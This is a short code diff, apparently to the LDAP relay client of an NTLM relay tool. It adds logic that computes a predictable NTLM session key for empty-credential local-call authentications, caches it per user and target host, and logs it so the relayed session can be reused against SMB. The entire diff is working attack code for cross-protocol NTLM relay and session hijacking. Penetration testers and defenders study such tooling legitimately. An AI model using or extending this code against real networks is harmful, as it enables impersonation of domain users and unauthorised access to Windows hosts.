@@ -140,6 +140,20 @@ class LDAPRelayClient(ProtocolClient):
                 authMessage['flags'] ^= NTLMSSP_NEGOTIATE_ALWAYS_SIGN
             # Do NOT remove KEY_EXCH or VERSION flags
             # Do NOT zero out MIC or Version fields - keep NTLM3 message intact
+
+            # Cache session key for cross-protocol relay (LDAP->SMB)
+            # For LOCAL_CALL with empty credentials and NON_NT_SESSION_KEY flag,
+            # calculate the predictable session key: LMOWFv1('', '')[:8] + b'\x00'*8
+            from impacket.ntlm import LMOWFv1
+            session_key = LMOWFv1('', '')[:8] + b'\x00'*8
+
+            username = authMessage['user_name'].decode('utf-16le') if authMessage['user_name'] else ''
+            domain = authMessage['domain_name'].decode('utf-16le') if authMessage['domain_name'] else ''
+            cache_key = f"{domain}\\{username}@{self.targetHost}".lower()
+
+            self.serverConfig.session_key_cache[cache_key] = session_key
+            LOG.info('[LDAP] Cached session key %s for %s (can be reused for SMB relay)' % (session_key.hex(), cache_key))
+
             token = authMessage.getData()
 
         with self.session.connection_lock:
